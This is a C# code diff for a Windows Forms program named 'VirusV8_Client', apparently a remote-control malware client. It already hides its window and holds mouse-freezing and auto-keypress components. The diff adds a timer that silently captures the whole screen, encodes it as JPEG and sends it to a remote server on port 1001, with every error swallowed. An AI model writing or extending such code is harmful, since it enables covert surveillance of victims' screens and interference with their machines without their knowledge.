@@ -20,6 +20,7 @@ namespace VirusV8_Client
         MouseFreeze mouseFreeze;
         AutoEnter autoenter;
         AutoSpace autospace;
+        ServerClient imagesender;
         String ip = "localhost";
        
         public Form1()
@@ -37,6 +38,7 @@ namespace VirusV8_Client
                 s = client.socket;
                 timerTryConnect.Enabled = false;
                 timerTryReceive.Enabled = true;
+                
             }
             catch(Exception exe)
             {
@@ -233,6 +235,8 @@ namespace VirusV8_Client
                 this.Opacity = 0;
             }
 
+            imagesender = new ServerClient(1001);
+
 
         }
 
@@ -244,6 +248,28 @@ namespace VirusV8_Client
         private void button101000xx_Click(object sender, EventArgs e)
         {
             textBox1.Text = "10.100.0.";
+        }
+
+        private void TimerSend_Tick(object sender, EventArgs e)
+        {
+            try
+            {
+                Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+                Graphics mg = Graphics.FromImage(bmp);
+                mg.CopyFromScreen(0, 0, 0, 0, bmp.Size);
+                imagesender.send(imageToByteArray(bmp));
+            }
+            catch (Exception EX)
+            {
+
+            }
+        }
+
+        public byte[] imageToByteArray(System.Drawing.Image imageIn)
+        {
+            MemoryStream ms = new MemoryStream();
+            imageIn.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
+            return ms.ToArray();
         }
     }
 }
